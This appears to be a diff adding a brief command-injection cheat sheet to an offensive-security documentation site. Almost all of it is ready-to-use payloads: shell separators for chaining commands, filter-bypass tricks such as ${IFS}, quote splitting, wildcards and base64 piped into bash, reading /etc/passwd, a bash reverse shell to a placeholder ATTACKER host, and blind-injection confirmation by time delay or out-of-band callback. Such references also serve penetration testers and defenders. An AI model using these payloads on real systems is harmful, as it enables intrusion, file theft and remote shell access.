@@ -1,0 +1,36 @@
+---
+title: "Command Injection"
+---
+
+User input reaches a shell. Chain your command with the app's using a separator.
+
+```bash
+# separators
+; id
+| id
+|| id
+&& id
+`id`
+$(id)
+%0a id          # newline (URL-encoded)
+```
+
+## Filter bypasses
+
+```bash
+# spaces
+cat</etc/passwd            ${IFS}            {cat,/etc/passwd}
+# blacklisted chars / keywords
+c''at /et''c/pa''sswd      w`h`oami          /???/??t /etc/passwd
+# encode
+echo aWQ= | base64 -d | bash
+```
+
+```bash
+# reverse shell once you have execution
+bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'
+```
+
+<Warning>
+Blind command injection: confirm with time delay (`; sleep 5`) or an out-of-band DNS/HTTP callback before assuming it failed.
+</Warning>
